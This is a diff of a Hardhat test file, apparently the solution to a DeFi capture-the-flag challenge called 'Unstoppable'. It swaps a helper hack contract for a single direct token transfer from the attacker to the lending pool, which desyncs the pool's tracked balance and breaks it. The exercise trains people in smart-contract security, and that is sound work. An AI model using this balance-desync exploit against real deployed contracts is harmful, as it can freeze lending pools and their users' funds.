@@ -35,12 +35,8 @@ describe("[Challenge] Unstoppable", function () {
   });
 
   it("Exploit", async function () {
-    const ReceiverHackFactory = await ethers.getContractFactory("ReceiverUnstoppableHack", attacker);
-    const receiverContractHack = await ReceiverHackFactory.deploy(this.pool.address);
-
     // Put more tokens at the hack contract in order to be able to send more back
-    await this.token.transfer(receiverContractHack.address, ethers.utils.parseEther("10"));
-    await receiverContractHack.executeFlashLoan(15);
+    await this.token.connect(attacker).transfer(this.pool.address, ethers.utils.parseEther("10"));
 
     const poolTokenBalance = await this.token.balanceOf(this.pool.address);
     const trackedPoolBalance = await this.pool.poolBalance();
